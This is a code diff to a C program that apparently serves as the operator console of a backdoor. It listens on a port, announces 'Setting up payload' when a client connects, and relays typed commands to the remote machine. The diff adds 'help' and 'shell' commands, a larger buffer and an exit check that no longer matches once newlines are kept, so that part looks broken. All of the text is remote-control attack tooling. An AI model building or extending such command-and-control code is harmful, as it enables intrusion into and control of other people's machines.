@@ -11,6 +11,9 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 
+//MY INCLUDES
+#include "help.h"
+
 #define DEFPORT 1234            //default port if nothing is given to listen on
 
 int main(int argc, char *argv[])
@@ -87,12 +90,14 @@ int main(int argc, char *argv[])
 	printf("Connection made! Setting up payload\nOrig: %d\nNow: %d\n", server_fd, sock);
 
 
-	char buff[2048];
+	char buff[8192];
 	char command[2048];
 
 	//this is the connection one just to confirm things worked on the client end
 	read(sock, buff, sizeof(buff));
 	printf("%s", buff);
+
+	int shell = 0;
 
 	while(1)
 	{
@@ -103,12 +108,22 @@ int main(int argc, char *argv[])
 		}
 
 		printf("COMMAND> ");
+
 		fgets(command, sizeof(command), stdin);
 
 		if(command[0] == '\n')	//if they just press enter
 			continue;
 
-		command[strlen(command) -1] = '\0'; //dump the newline off of the command
+//		command[strlen(command) -1] = '\0'; //dump the newline off of the command handled in payload for now
+
+		if(!strcmp(command, "help\n"))
+		{
+			help(sock);
+			continue;
+		}
+
+		if(!strcmp(command, "shell\n"))
+			shell++;
 
 		write(sock, command, strlen(command));
 
@@ -119,6 +134,9 @@ int main(int argc, char *argv[])
 
 		read(sock, buff, sizeof(buff));
 		puts(buff);
+
+		if(!strcmp(command, "exit"))
+			return 1;
 
 	}
 
